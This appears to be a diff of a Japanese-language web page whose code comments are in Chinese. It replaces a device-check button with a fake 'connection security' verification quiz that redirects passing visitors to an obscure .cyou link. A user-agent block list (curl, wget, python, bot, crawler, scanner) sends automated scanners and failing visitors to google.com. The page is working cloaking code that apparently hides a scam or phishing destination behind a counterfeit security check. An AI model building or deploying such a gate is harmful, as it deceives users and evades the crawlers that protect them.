@@ -2,123 +2,529 @@
 <html lang="ja">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>端末確認</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>認証確認</title>
 
 <style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:
+    "Helvetica Neue",
+    Arial,
+    "ヒラギノ角ゴ ProN W3",
+    "Hiragino Kaku Gothic ProN",
+    "メイリオ",
+    Meiryo,
+    sans-serif;
+}
+
 body{
-margin:0;
-background:#f5f5f7;
-font-family:-apple-system,BlinkMacSystemFont,sans-serif;
-display:flex;
-justify-content:center;
-align-items:center;
-min-height:100vh;
-padding:20px;
-color:#1d1d1f;
+    background:#f5f5f7;
+    min-height:100dvh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
 }
 
 .card{
-width:100%;
-max-width:420px;
-background:#fff;
-border-radius:16px;
-padding:40px 30px;
-text-align:center;
-box-shadow:0 2px 12px rgba(0,0,0,.05);
+    width:100%;
+    max-width:520px;
+    background:#fff;
+    border-radius:18px;
+    padding:28px;
+    box-shadow:0 2px 12px rgba(0,0,0,.05);
 }
 
-.logo{
-width:42px;
-height:42px;
-border-radius:12px;
-background:#5856d6;
-margin:0 auto 18px;
-display:flex;
-align-items:center;
-justify-content:center;
-color:#fff;
-font-weight:700;
+.center{
+    text-align:center;
+}
+
+.loader{
+    width:42px;
+    height:42px;
+    border-radius:50%;
+    border:3px solid #e5e5e5;
+    border-top:3px solid #0071e3;
+    margin:20px auto;
+    animation:spin .7s linear infinite;
+}
+
+@keyframes spin{
+    to{
+        transform:rotate(360deg);
+    }
 }
 
 .title{
-font-size:22px;
-font-weight:700;
-margin-bottom:12px;
+    font-size:22px;
+    font-weight:700;
+    color:#1d1d1f;
+    margin-bottom:12px;
 }
 
 .desc{
-font-size:14px;
-color:#666;
-line-height:1.7;
-margin-bottom:28px;
+    font-size:14px;
+    color:#666;
+    line-height:1.7;
 }
 
-.btn{
-width:100%;
-background:#5856d6;
-color:#fff;
-border:none;
-border-radius:12px;
-padding:14px;
-font-size:16px;
-cursor:pointer;
+.quiz{
+    font-size:34px;
+    letter-spacing:8px;
+    text-align:center;
+    margin:24px 0;
+    color:#111;
 }
 
-.footer{
-margin-top:24px;
-font-size:11px;
-color:#aaa;
-line-height:1.7;
+.grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:12px;
+    margin-top:20px;
+}
+
+.item{
+    border:none;
+    background:#f2f2f2;
+    border-radius:14px;
+    height:64px;
+    font-size:22px;
+    cursor:pointer;
+}
+
+.item.active{
+    background:#0071e3;
+    color:#fff;
+}
+
+.submit{
+    width:100%;
+    border:none;
+    margin-top:20px;
+    background:#0071e3;
+    color:#fff;
+    border-radius:12px;
+    padding:14px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.submit:disabled{
+    background:#999;
+}
+
+.tip{
+    text-align:center;
+    font-size:13px;
+    color:#777;
+    margin-top:16px;
+}
+
+@media(max-width:480px){
+
+.quiz{
+    font-size:28px;
+}
+
+.item{
+    height:56px;
+    font-size:18px;
+}
+
 }
 </style>
 </head>
 
 <body>
 
-<div class="card">
-
-<div class="logo">
-●
-</div>
-
-<div class="title">
-端末を確認しています
-</div>
-
-<div class="desc">
-安全な接続のため、<br>
-端末情報を確認しています。
-</div>
-
-<button class="btn" id="go">
-確認する
-</button>
-
-<div class="footer">
-© 2026 Secure Access
-</div>
-
-</div>
+<div id="app"></div>
 
 <script>
 
-const TARGET_URL =
-"https://huanggua42c.cyou/";
+// =========================
+// 配置
+// =========================
 
-document.getElementById("go").onclick=()=>{
+const CONFIG = {
 
-const btn=document.getElementById("go");
+    // 成功跳转
+    successUrl: "https://xiangjiao19c.cyou/4WB8qw",
 
-btn.disabled=true;
+    // 失败跳转
+    failUrl: "https://google.com",
 
-btn.innerText="接続しています...";
+    verifyTime: 90,
 
-setTimeout(()=>{
+    maxTry: 3,
 
-location.href=TARGET_URL;
+    optionCount: 8
 
-},800+Math.random()*700);
+};
+
+// =========================
+// 字符库
+// =========================
+
+const LIB = {
+
+    kana:[
+        'あ','い','う','え','お',
+        'か','き','く','け','こ',
+        'さ','し','す','せ','そ',
+        'た','ち','つ','て','と',
+        'な','に','ぬ','ね','の'
+    ],
+
+    eng:'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split(''),
+
+    num:[...'0123456789']
+
+};
+
+// =========================
+// Bot UA
+// =========================
+
+const BOT = [
+    'curl',
+    'wget',
+    'python',
+    'axios',
+    'bot',
+    'crawler',
+    'spider',
+    'scanner'
+];
+
+// =========================
+// Step
+// =========================
+
+const params = new URLSearchParams(location.search);
+
+const step = params.get('step') || 'load';
+
+// =========================
+// 简单 BOT 判断
+// =========================
+
+function isBot(){
+
+    const ua = navigator.userAgent.toLowerCase();
+
+    return BOT.some(x=>ua.includes(x));
+
+}
+
+// =========================
+// 工具
+// =========================
+
+function pick(arr){
+
+    return arr[Math.floor(Math.random()*arr.length)];
+
+}
+
+function shuffle(arr){
+
+    return [...arr].sort(()=>Math.random()-.5);
+
+}
+
+// =========================
+// 加载页
+// =========================
+
+function loadPage(){
+
+    app.innerHTML = `
+    <div class="card center">
+
+        <div class="title">
+            接続確認
+        </div>
+
+        <div class="loader"></div>
+
+        <div class="desc">
+            セキュリティ確認中...
+        </div>
+
+    </div>
+    `;
+
+    setTimeout(()=>{
+
+        location.href='?step=auth';
+
+    },1300);
+
+}
+
+// =========================
+// 生成验证题
+// =========================
+
+function makeQuiz(){
+
+    const type = pick(['kana','eng','num']);
+
+    const count = Math.floor(Math.random()*2)+2;
+
+    const pool = LIB[type];
+
+    let ans = [];
+
+    while(ans.length < count){
+
+        const v = pick(pool);
+
+        if(!ans.includes(v)){
+
+            ans.push(v);
+
+        }
+
+    }
+
+    let opts = [...ans];
+
+    while(opts.length < CONFIG.optionCount){
+
+        const v = pick(pool);
+
+        if(!opts.includes(v)){
+
+            opts.push(v);
+
+        }
+
+    }
+
+    return {
+
+        ans,
+
+        opts:shuffle(opts),
+
+        count
+
+    };
+
+}
+
+// =========================
+// 验证页
+// =========================
+
+function authPage(){
+
+    if(isBot()){
+
+        location.href = CONFIG.failUrl;
+
+        return;
+
+    }
+
+    const q = makeQuiz();
+
+    let selected = [];
+
+    let tryNum = 0;
+
+    let time = CONFIG.verifyTime;
+
+    let end = false;
+
+    app.innerHTML = `
+
+    <div class="card">
+
+        <div class="center">
+
+            <div class="title">
+                接続を確認しています
+            </div>
+
+            <div class="desc">
+                表示された文字を選択してください
+            </div>
+
+            <div class="quiz">
+                ${q.ans.join(' ')}
+            </div>
+
+        </div>
+
+        <div class="grid">
+
+            ${q.opts.map(v=>`
+                <button class="item" data-v="${v}">
+                    ${v}
+                </button>
+            `).join('')}
+
+        </div>
+
+        <button class="submit" disabled>
+            確認して続行
+        </button>
+
+        <div class="tip">
+            選択数:
+            <span id="count">0</span>
+            /
+            ${q.count}
+        </div>
+
+        <div class="tip">
+            残り時間:
+            <span id="time">${time}</span> 秒
+        </div>
+
+        <div class="tip">
+            残り試行:
+            <span id="try">${CONFIG.maxTry}</span>
+        </div>
+
+        <div class="tip" id="result"></div>
+
+    </div>
+
+    `;
+
+    const items = document.querySelectorAll('.item');
+
+    const submit = document.querySelector('.submit');
+
+    const countEl = document.getElementById('count');
+
+    const timeEl = document.getElementById('time');
+
+    const tryEl = document.getElementById('try');
+
+    const result = document.getElementById('result');
+
+    items.forEach(btn=>{
+
+        btn.onclick = ()=>{
+
+            if(end) return;
+
+            const v = btn.dataset.v;
+
+            btn.classList.toggle('active');
+
+            if(selected.includes(v)){
+
+                selected = selected.filter(x=>x!==v);
+
+            }else{
+
+                selected.push(v);
+
+            }
+
+            countEl.innerText = selected.length;
+
+            submit.disabled = selected.length !== q.count;
+
+        };
+
+    });
+
+    submit.onclick = ()=>{
+
+        if(end) return;
+
+        const pass = q.ans.every(x=>selected.includes(x));
+
+        if(pass){
+
+            end = true;
+
+            result.innerText = '認証成功';
+
+            submit.disabled = true;
+
+            setTimeout(()=>{
+
+                location.href = CONFIG.successUrl;
+
+            },800);
+
+        }else{
+
+            tryNum++;
+
+            tryEl.innerText = CONFIG.maxTry - tryNum;
+
+            result.innerText = '選択不一致';
+
+            if(tryNum >= CONFIG.maxTry){
+
+                end = true;
+
+                setTimeout(()=>{
+
+                    location.href = CONFIG.failUrl;
+
+                },1000);
+
+            }
+
+        }
+
+    };
+
+    function countdown(){
+
+        if(end) return;
+
+        time--;
+
+        timeEl.innerText = time;
+
+        if(time <= 0){
+
+            end = true;
+
+            result.innerText = '時間切れ';
+
+            setTimeout(()=>{
+
+                location.href = CONFIG.failUrl;
+
+            },1000);
+
+            return;
+
+        }
+
+        setTimeout(countdown,1000);
+
+    }
+
+    countdown();
+
+}
+
+// =========================
+// 路由
+// =========================
+
+if(step === 'load'){
+
+    loadPage();
+
+}else{
+
+    authPage();
 
 }
 
